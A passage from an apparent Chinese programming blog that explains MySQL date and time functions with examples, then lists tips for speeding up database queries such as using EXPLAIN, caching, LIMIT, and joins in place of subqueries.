<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="variable">@dt</span> <span class="operator">=</span> now();</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> <span class="keyword">day</span>);        <span class="comment">-- add 1 day </span></span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> <span class="keyword">hour</span>);       <span class="comment">-- add 1 hour </span></span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> <span class="keyword">minute</span>);     <span class="comment">-- ... </span></span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> <span class="keyword">second</span>); </span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> microsecond); </span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> week); </span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> <span class="keyword">month</span>); </span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> quarter); </span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">1</span> <span class="keyword">year</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="number">-1</span> <span class="keyword">day</span>);       <span class="comment">-- sub 1 day</span></span><br><span class="line"></span><br><span class="line">MySQL adddate (), addtime () 函数，可以用 date_add () 来替代。下面是 date_add () 实现 addtime () 功能示例：</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="variable">@dt</span> <span class="operator">=</span> <span class="string">&#x27;2008-08-09 12:12:33&#x27;</span>;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> </span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="string">&#x27;01:15:30&#x27;</span> hour_second);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------+ </span></span><br><span class="line"><span class="operator">|</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="string">&#x27;01:15:30&#x27;</span> hour_second) <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------+ </span></span><br><span class="line"><span class="operator">|</span> <span class="number">2008</span><span class="number">-08</span><span class="number">-09</span> <span class="number">13</span>:<span class="number">28</span>:<span class="number">03</span>                            <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="string">&#x27;1 01:15:30&#x27;</span> day_second);</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+ </span></span><br><span class="line"><span class="operator">|</span> date_add(<span class="variable">@dt</span>, <span class="type">interval</span> <span class="string">&#x27;1 01:15:30&#x27;</span> day_second) <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+ </span></span><br><span class="line"><span class="operator">|</span> <span class="number">2008</span><span class="number">-08</span><span class="number">-10</span> <span class="number">13</span>:<span class="number">28</span>:<span class="number">03</span>                             <span class="operator">|</span> </span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line">date_add () 函数，分别为 <span class="variable">@dt</span> 增加了 “<span class="number">1</span> 小时 <span class="number">15</span> 分 <span class="number">30</span> 秒” 和 “<span class="number">1</span> 天 <span class="number">1</span> 小时 <span class="number">15</span> 分 <span class="number">30</span> 秒”。建议：总是使用 date_add () 日期时间函数来替代 adddate (), addtime ()。</span><br></pre></td></tr></table></figure>
</li>
<li><p>MySQL 为日期减去一个时间间隔：date_sub ()</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select date_sub(<span class="emphasis">&#x27;1998-01-01 00:00:00&#x27;</span>, interval <span class="emphasis">&#x27;1 1:1:1&#x27;</span> day_second);</span><br><span class="line"></span><br><span class="line"><span class="code">+----------------------------------------------------------------+</span> </span><br><span class="line">| date_sub(<span class="emphasis">&#x27;1998-01-01 00:00:00&#x27;</span>, interval <span class="emphasis">&#x27;1 1:1:1&#x27;</span> day_second) | </span><br><span class="line"><span class="code">+----------------------------------------------------------------+</span> </span><br><span class="line"><span class="section">| 1997-12-30 22:58:59                                            | </span></span><br><span class="line"><span class="section">+----------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>MySQL date_sub () 日期时间函数 和 date_add () 用法一致，不再赘述。另外，MySQL 中还有两个函数 subdate (), subtime ()，建议，用 date_sub () 来替代。</p>
<ol start="3">
<li>MySQL 另类日期函数：period_add (P,N), period_diff (P1,P2)</li>
</ol>
<p>函数参数 “P” 的格式为 “YYYYMM” 或者 “YYMM”，第二个参数 “N” 表示增加或减去 N month（月）。</p>
<p>MySQL period_add (P,N)：日期加 &#x2F; 减去 N 月。</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select period_add(200808,2), period_add(20080808,-2)</span><br><span class="line"></span><br><span class="line"><span class="code">+----------------------+</span>-------------------------+ </span><br><span class="line">| period_add(200808,2) | period_add(20080808,-2) | </span><br><span class="line"><span class="code">+----------------------+</span>-------------------------+ </span><br><span class="line"><span class="section">|               200810 |                20080806 | </span></span><br><span class="line"><span class="section">+----------------------+-------------------------+</span></span><br><span class="line"></span><br><span class="line">MySQL period_diff (P1,P2)：日期 P1-P2，返回 N 个月。</span><br><span class="line"></span><br><span class="line">mysql&gt; select period_diff(200808, 200801);</span><br><span class="line"></span><br><span class="line"><span class="code">+-----------------------------+</span> </span><br><span class="line">| period_diff(200808, 200801) | </span><br><span class="line"><span class="code">+-----------------------------+</span> </span><br><span class="line"><span class="section">|                           7 | </span></span><br><span class="line"><span class="section">+-----------------------------+</span></span><br></pre></td></tr></table></figure>

<p>在 MySQL 中，这两个日期函数，一般情况下很少用到。</p>
<ol start="4">
<li>MySQL 日期、时间相减函数：datediff (date1,date2), timediff (time1,time2)<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">MySQL</span> datediff (date1,date2)：两个日期相减 date1 - date2，返回天数。</span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> datediff(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span>&#x27;, &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">01</span>&#x27;); -- <span class="number">7</span> </span><br><span class="line"><span class="attribute">select</span> datediff(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">01</span>&#x27;, &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span>&#x27;); -- -<span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">MySQL</span> timediff (time1,time2)：两个日期相减 time1 - time2，返回 time 差值。</span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> timediff(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">08</span>:<span class="number">08</span>:<span class="number">08</span>&#x27;, &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;); -- <span class="number">08</span>:<span class="number">08</span>:<span class="number">08</span> </span><br><span class="line"><span class="attribute">select</span> timediff(&#x27;<span class="number">08</span>:<span class="number">08</span>:<span class="number">08</span>&#x27;, &#x27;<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>&#x27;);                       -- <span class="number">08</span>:<span class="number">08</span>:<span class="number">08</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>注意：timediff (time1,time2) 函数的两个参数类型必须相同。</p>
<p>四、MySQL 日期转换函数、时间转换函数 </p>
<ol>
<li><p>MySQL （时间、秒）转换函数：time_to_sec (time), sec_to_time (seconds)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> time_to_sec(&#x27;<span class="number">01</span>:<span class="number">00</span>:<span class="number">05</span>&#x27;); -- <span class="number">3605</span> </span><br><span class="line"><span class="attribute">select</span> sec_to_time(<span class="number">3605</span>);        -- &#x27;<span class="number">01</span>:<span class="number">00</span>:<span class="number">05</span>&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>MySQL （日期、天数）转换函数：to_days (date), from_days (days)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> to_days(&#x27;<span class="number">0000</span>-<span class="number">00</span>-<span class="number">00</span>&#x27;); -- <span class="number">0</span> </span><br><span class="line"><span class="attribute">select</span> to_days(&#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span>&#x27;); -- <span class="number">733627</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> from_days(<span class="number">0</span>);           -- &#x27;<span class="number">0000</span>-<span class="number">00</span>-<span class="number">00</span>&#x27; </span><br><span class="line"><span class="attribute">select</span> from_days(<span class="number">733627</span>);      -- &#x27;<span class="number">2008</span>-<span class="number">08</span>-<span class="number">08</span>&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>MySQL Str to Date （字符串转换为日期）函数：str_to_date (str, format)</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> str_to_date(&#x27;<span class="number">08</span>/<span class="number">09</span>/<span class="number">2008</span>&#x27;, &#x27;%m/%d/%Y&#x27;);                   -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">09</span> </span><br><span class="line"><span class="attribute">select</span> str_to_date(&#x27;<span class="number">08</span>/<span class="number">09</span>/<span class="number">08</span>&#x27; , &#x27;%m/%d/%y&#x27;);                   -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">09</span> </span><br><span class="line"><span class="attribute">select</span> str_to_date(&#x27;<span class="number">08</span>.<span class="number">09</span>.<span class="number">2008</span>&#x27;, &#x27;%m.%d.%Y&#x27;);                   -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">09</span> </span><br><span class="line"><span class="attribute">select</span> str_to_date(&#x27;<span class="number">08</span>:<span class="number">09</span>:<span class="number">30</span>&#x27;, &#x27;%h:%i:%s&#x27;);                     -- <span class="number">08</span>:<span class="number">09</span>:<span class="number">30</span> </span><br><span class="line"><span class="attribute">select</span> str_to_date(&#x27;<span class="number">08</span>.<span class="number">09</span>.<span class="number">2008</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">30</span>&#x27;, &#x27;%m.%d.%Y %h:%i:%s&#x27;); -- <span class="number">2008</span>-<span class="number">08</span>-<span class="number">09</span> <span class="number">08</span>:<span class="number">09</span>:<span class="number">30</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>可以看到，str_to_date (str,format) 转换函数，可以把一些杂乱无章的字符串转换为日期格式。另外，它也可以转换为时间。“format” 可以参看 MySQL 手册。</p>
<ol start="4">
<li>MySQL Date&#x2F;Time to Str（日期 &#x2F; 时间转换为字符串）函数：date_format (date,format), time_format (time,format)<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">mysql&gt; select date_format(<span class="emphasis">&#x27;2008-08-08 22:23:00&#x27;</span>, <span class="emphasis">&#x27;%W %M %Y&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="code">+------------------------------------------------+</span> </span><br><span class="line">| date_format(<span class="emphasis">&#x27;2008-08-08 22:23:00&#x27;</span>, <span class="emphasis">&#x27;%W %M %Y&#x27;</span>) | </span><br><span class="line"><span class="code">+------------------------------------------------+</span> </span><br><span class="line"><span class="section">| Friday August 2008                             | </span></span><br><span class="line"><span class="section">+------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select date_format(<span class="emphasis">&#x27;2008-08-08 22:23:01&#x27;</span>, <span class="emphasis">&#x27;%Y%m%d%H%i%s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="code">+----------------------------------------------------+</span> </span><br><span class="line">| date_format(<span class="emphasis">&#x27;2008-08-08 22:23:01&#x27;</span>, <span class="emphasis">&#x27;%Y%m%d%H%i%s&#x27;</span>) | </span><br><span class="line"><span class="code">+----------------------------------------------------+</span> </span><br><span class="line"><span class="section">| 20080808222301                                     | </span></span><br><span class="line"><span class="section">+----------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line">mysql&gt; select time_format(<span class="emphasis">&#x27;22:23:01&#x27;</span>, <span class="emphasis">&#x27;%H.%i.%s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="code">+-------------------------------------+</span> </span><br><span class="line">| time_format(<span class="emphasis">&#x27;22:23:01&#x27;</span>, <span class="emphasis">&#x27;%H.%i.%s&#x27;</span>) | </span><br><span class="line"><span class="code">+-------------------------------------+</span> </span><br><span class="line"><span class="section">| 22.23.01                            | </span></span><br><span class="line"><span class="section">+-------------------------------------+</span></span><br></pre></td></tr></table></figure></li>
</ol>
<p>MySQL 日期、时间转换函数：date_format (date,format), time_format (time,format) 能够把一个日期 &#x2F; 时间转换成各种各样的字符串格式。它是 str_to_date (str,format) 函数的 一个逆转换。</p>
<ol start="5">
<li>MySQL 获得国家地区时间格式函数：get_format ()</li>
</ol>
<p>MySQL get_format () 语法：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">get_format(date|time|datetime, <span class="string">&#x27;eur&#x27;</span>|<span class="string">&#x27;usa&#x27;</span>|<span class="string">&#x27;jis&#x27;</span>|<span class="string">&#x27;iso&#x27;</span>|<span class="string">&#x27;internal&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function">MySQL <span class="title">get_format</span> () 用法的全部示例：</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">date,<span class="string">&#x27;usa&#x27;</span></span>)</span>          ;   -- <span class="string">&#x27;%m.%d.%Y&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">date,<span class="string">&#x27;jis&#x27;</span></span>)</span>          ;   -- <span class="string">&#x27;%Y-%m-%d&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">date,<span class="string">&#x27;iso&#x27;</span></span>)</span>          ;   -- <span class="string">&#x27;%Y-%m-%d&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">date,<span class="string">&#x27;eur&#x27;</span></span>)</span>          ;   -- <span class="string">&#x27;%d.%m.%Y&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">date,<span class="string">&#x27;internal&#x27;</span></span>)</span>     ;   -- <span class="string">&#x27;%Y%m%d&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">datetime,<span class="string">&#x27;usa&#x27;</span></span>)</span>      ;   -- <span class="string">&#x27;%Y-%m-%d %H.%i.%s&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">datetime,<span class="string">&#x27;jis&#x27;</span></span>)</span>      ;   -- <span class="string">&#x27;%Y-%m-%d %H:%i:%s&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">datetime,<span class="string">&#x27;iso&#x27;</span></span>)</span>      ;   -- <span class="string">&#x27;%Y-%m-%d %H:%i:%s&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">datetime,<span class="string">&#x27;eur&#x27;</span></span>)</span>      ;   -- <span class="string">&#x27;%Y-%m-%d %H.%i.%s&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">datetime,<span class="string">&#x27;internal&#x27;</span></span>)</span> ;   -- <span class="string">&#x27;%Y%m%d%H%i%s&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">time,<span class="string">&#x27;usa&#x27;</span></span>)</span>          ;   -- <span class="string">&#x27;%h:%i:%s %p&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">time,<span class="string">&#x27;jis&#x27;</span></span>)</span>          ;   -- <span class="string">&#x27;%H:%i:%s&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">time,<span class="string">&#x27;iso&#x27;</span></span>)</span>          ;   -- <span class="string">&#x27;%H:%i:%s&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">time,<span class="string">&#x27;eur&#x27;</span></span>)</span>          ;   -- <span class="string">&#x27;%H.%i.%s&#x27;</span> </span><br><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">get_format</span>(<span class="params">time,<span class="string">&#x27;internal&#x27;</span></span>)</span>     ;   -- <span class="string">&#x27;%H%i%s&#x27;</span></span><br></pre></td></tr></table></figure>

<p>MySQL get_format () 函数在实际中用到机会的比较少。</p>
<ol start="6">
<li>MySQL 拼凑日期、时间函数：makdedate (year,dayofyear), maketime (hour,minute,second)<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">select</span> makedate(<span class="number">2001</span>,<span class="number">31</span>);   -- &#x27;<span class="number">2001</span>-<span class="number">01</span>-<span class="number">31</span>&#x27; </span><br><span class="line"><span class="attribute">select</span> makedate(<span class="number">2001</span>,<span class="number">32</span>);   -- &#x27;<span class="number">2001</span>-<span class="number">02</span>-<span class="number">01</span>&#x27;</span><br><span class="line"></span><br><span class="line"><span class="attribute">select</span> maketime(<span class="number">12</span>,<span class="number">15</span>,<span class="number">30</span>); -- &#x27;<span class="number">12</span>:<span class="number">15</span>:<span class="number">30</span>&#x27;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="MySQL-时区（timezone）转换函数"><a href="#MySQL-时区（timezone）转换函数" class="headerlink" title="MySQL 时区（timezone）转换函数"></a>MySQL 时区（timezone）转换函数</h2><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">convert_tz(dt,from_tz,to_tz)</span><br><span class="line"></span><br><span class="line">select convert_tz(&#x27;2008<span class="string">-08</span><span class="string">-08</span> 12:00:00&#x27;, &#x27;<span class="string">+08</span>:00&#x27;, &#x27;<span class="string">+00</span>:00&#x27;); -- 2008<span class="string">-08</span><span class="string">-08</span> 04:00:00</span><br><span class="line"></span><br><span class="line">时区转换也可以通过 date_add, date_sub, timestampadd 来实现。</span><br><span class="line"></span><br><span class="line">select date_add(&#x27;2008<span class="string">-08</span><span class="string">-08</span> 12:00:00&#x27;, interval <span class="string">-8</span> hour); -- 2008<span class="string">-08</span><span class="string">-08</span> 04:00:00 </span><br><span class="line">select date_sub(&#x27;2008<span class="string">-08</span><span class="string">-08</span> 12:00:00&#x27;, interval 8 hour); -- 2008<span class="string">-08</span><span class="string">-08</span> 04:00:00 </span><br><span class="line">select timestampadd(hour, <span class="string">-8</span>, &#x27;2008<span class="string">-08</span><span class="string">-08</span> 12:00:00&#x27;);      -- 2008<span class="string">-08</span><span class="string">-08</span> 04:00:00</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
  </entry>
  <entry>
    <title>数据库学习建议之提高数据库速度的十条建议</title>
    <url>/2017/04/mysql-performace/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>很多网站的重要信息都是保存在数据库中的，用户通过提交访问数据库来获取用户信息。</p>
<p>如果数据库速度非常的快，有助于节省服务器的资源，在这篇文章中，我收集了十个优化数据库速度的技巧。</p>
<span id="more"></span>

<h2 id="小心设计数据库"><a href="#小心设计数据库" class="headerlink" title="小心设计数据库"></a>小心设计数据库</h2><p>第一个技巧也许看来理所当然，但事实上大部分数据库的问题都来自于设计不好的数据库结构。</p>
<p>譬如我曾经遇见过将客户端信息和支付信息储存在同一个数据库列中的例子。对于系统和用数据库的开发者来说，这很糟糕。</p>
<p>新建数据库时，应当将信息储存在不同的表里，采用标准的命名方式，并采用主键。</p>
<p>来源: <span class="exturl" data-url="aHR0cDovL3d3dy5zaW1wbGUtdGFsay5jb20vc3FsL2RhdGFiYXNlLWFkbWluaXN0cmF0aW9uL3Rlbi1jb21tb24tZGF0YWJhc2UtZGVzaWduLW1pc3Rha2VzLw==">http://www.simple-talk.com/sql/database-administration/ten-common-database-design-mistakes/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="清楚你需要优化的地方"><a href="#清楚你需要优化的地方" class="headerlink" title="清楚你需要优化的地方"></a>清楚你需要优化的地方</h2><p>如果你想优化某个查询语句，清楚的知道这个语句的结果是非常有帮助的。采用 EXPLAIN 语句，你将获得很多有用的信息，下面来看个例子：</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXPLAIN</span> <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> ref_table,other_table <span class="keyword">WHERE</span> ref_table.key_column=other_table.<span class="keyword">column</span>;</span><br></pre></td></tr></table></figure>

<p>来源: <span class="exturl" data-url="aHR0cDovL2Rldi5teXNxbC5jb20vZG9jL3JlZm1hbi81LjAvZW4vdXNpbmctZXhwbGFpbi5odG1s">http://dev.mysql.com/doc/refman/5.0/en/using-explain.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="最快的查询语句…-是那些你没发送的语句"><a href="#最快的查询语句…-是那些你没发送的语句" class="headerlink" title="最快的查询语句… 是那些你没发送的语句"></a>最快的查询语句… 是那些你没发送的语句</h2><p>每次你向数据库发送一条语句，你都会用掉很多服务器资源。所以在很高流量的网站中，最好的方法是将你的查询语句缓存起来。</p>
<p>有许多种缓存语句的方法，下面列出了几个：</p>
<p>AdoDB: AdoDB 是一个 PHP 的数据库简化库。使用它，你可以选用不同的数据库系统 (MySQL, PostGreSQL, Interbase 等等)，而且它就是为了速度而设计的。</p>
<p>AdoDB 提供了简单但强大的缓存系统。还有，AdoDB 拥有 BSD 许可，你可以在你的项目中免费使用它。对于商业化的项目，它也有 LGPL 许可。</p>
<p>Memcached:Memcached 是一种分布式内存缓存系统，它可以减轻数据库的负载，来加速基于动态数据库的网站。</p>
<p>CSQL Cache: CSQL 缓存是一个开源的数据缓存架构。我没有试过它，但它看起来非常的棒。</p>
<h2 id="不要-select-你不需要的"><a href="#不要-select-你不需要的" class="headerlink" title="不要 select 你不需要的"></a>不要 select 你不需要的</h2><p>获取想要的数据，一种非常常见的方式就是采用 * 字符，这会列出所有的列。</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> wp_posts;</span><br></pre></td></tr></table></figure>

<p>然而，你应该仅列出你需要的列，如下所示。如果在一个非常小型的网站，譬如，一分钟一个用户访问，可能没有什么分别。</p>
<p>然而如果像 Cats Who Code 这样大流量的网站，这就为数据库省了很多事。</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">title</span>, excerpt, author <span class="keyword">FROM</span> wp_posts;</span><br></pre></td></tr></table></figure>

<h2 id="采用-LIMIT"><a href="#采用-LIMIT" class="headerlink" title="采用 LIMIT"></a>采用 LIMIT</h2><p>仅获得某个特定行数的数据是非常常见的。譬如博客每页只显示十篇文章。这时，你应该使用 LIMIT，来限定你想选定的数据的行数。</p>
<p>如果没有 LIMIT，表有 100,000 行数据，你将会遍历所有的行数，这对于服务器来说是不必要的负担。</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">title</span>, excerpt, author <span class="keyword">FROM</span> wp_posts <span class="keyword">LIMIT</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<h2 id="避免循环中的查询"><a href="#避免循环中的查询" class="headerlink" title="避免循环中的查询"></a>避免循环中的查询</h2><p>当在 PHP 中使用 SQL 时，可以将 SQL 放在循环语句中。但这么做给你的数据库增加了负担。</p>
<p>下面的例子说明了 “在循环语句中嵌套查询语句” 的问题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$display_order</span> <span class="keyword">as</span> <span class="variable">$id</span> =&gt; <span class="variable">$ordinal</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;UPDATE categories SET display_order = <span class="subst">$ordinal</span> WHERE id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>你可以这么做：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UPDATE</span> categories</span><br><span class="line"></span><br><span class="line"><span class="attribute">SET</span> display_order = CASE id</span><br><span class="line"></span><br><span class="line"><span class="attribute">WHEN</span> <span class="number">1</span> THEN <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">WHEN</span> <span class="number">2</span> THEN <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">WHEN</span> <span class="number">3</span> THEN <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">END</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">WHERE</span> id IN (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>

<p>来源: <span class="exturl" data-url="aHR0cDovL3d3dy5rYXJscml4b24uY28udWsvYXJ0aWNsZXMvc3FsL3VwZGF0ZS1tdWx0aXBsZS1yb3dzLXdpdGgtZGlmZmVyZW50LXZhbHVlcy1hbmQtYS1zaW5nbGUtc3FsLXF1ZXJ5Lw==">http://www.karlrixon.co.uk/articles/sql/update-multiple-rows-with-different-values-and-a-single-sql-query/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="采用-join-来替换子查询"><a href="#采用-join-来替换子查询" class="headerlink" title="采用 join 来替换子查询"></a>采用 join 来替换子查询</h2><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">As a programmer, <span class="keyword">subqueries </span>are something that you can <span class="keyword">be </span>tempted to use <span class="keyword">and </span>abuse. <span class="keyword">Subqueries, </span>as <span class="keyword">show </span><span class="keyword">below, </span>can <span class="keyword">be </span>very useful:</span><br></pre></td></tr></table></figure>

<p>程序员可能会喜欢用子查询，甚至滥用。下面的子查询非常有用：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> a.id,</span><br><span class="line"></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">MAX</span>(created)</span><br><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> posts</span><br><span class="line"></span><br><span class="line"><span class="keyword">WHERE</span> author_id = a.id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">AS</span> latest_post <span class="keyword">FROM</span> authors a</span><br></pre></td></tr></table></figure>

<p>虽然子查询很有用，但 join 语句可以替换它，join 语句执行起来更快。</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">SELECT <span class="selector-tag">a</span><span class="selector-class">.id</span>, <span class="built_in">MAX</span>(<span class="selector-tag">p</span>.created) AS latest_post</span><br><span class="line"></span><br><span class="line">FROM authors <span class="selector-tag">a</span></span><br><span class="line"></span><br><span class="line">INNER JOIN posts <span class="selector-tag">p</span></span><br><span class="line"></span><br><span class="line">ON (<span class="selector-tag">a</span><span class="selector-class">.id</span> = <span class="selector-tag">p</span>.author_id)</span><br><span class="line"></span><br><span class="line">GROUP BY <span class="selector-tag">a</span>.id</span><br></pre></td></tr></table></figure>

<p>来源: <span class="exturl" data-url="aHR0cDovLzIwYml0cy5jb20vYXJ0aWNsZXMvMTAtdGlwcy1mb3Itb3B0aW1pemluZy1teXNxbC1xdWVyaWVzLXRoYXQtZG9udC1zdWNrLw==">http://20bits.com/articles/10-tips-for-optimizing-mysql-queries-that-dont-suck/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="小心使用通配符"><a href="#小心使用通配符" class="headerlink" title="小心使用通配符"></a>小心使用通配符</h2><p>通配符非常好用，在搜索数据的时候可以用通配符来代替一个或多个字符。</p>
<p>我不是说不能用，而是，应该小心使用，并且不要使用全词通配符 (full wildcard)，前缀通配符或后置通配符可以完成相同的任务。</p>
<p>事实上，在百万数量级的数据上采用全词通配符来搜索会让你的数据库当机。</p>
